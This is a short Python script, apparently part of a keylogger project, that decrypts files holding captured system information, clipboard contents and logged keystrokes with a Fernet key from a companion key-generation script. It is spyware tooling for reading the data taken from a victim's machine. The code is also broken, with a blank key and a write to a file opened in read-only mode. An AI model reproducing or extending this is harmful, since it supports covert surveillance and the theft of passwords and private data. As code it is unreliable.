from cryptography.fernet import Fernet

# Key generated thanks to generateKey.py
key = " "

systemInformationEncrypted = "systemInformationE.txt"
clipboardInformationEncrypted = "clipboardE.txt"
keysInformationEncrypted = "keyLogE.txt"

encryptedFiles = [systemInformationEncrypted,clipboardInformationEncrypted,keysInformationEncrypted]
countFiles = 0

for files in encryptedFiles:
    with open(encryptedFiles[countFiles], 'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    with open(encryptedFiles[countFiles], 'rb') as file:
        file.write(decrypted)
    countFiles += 1



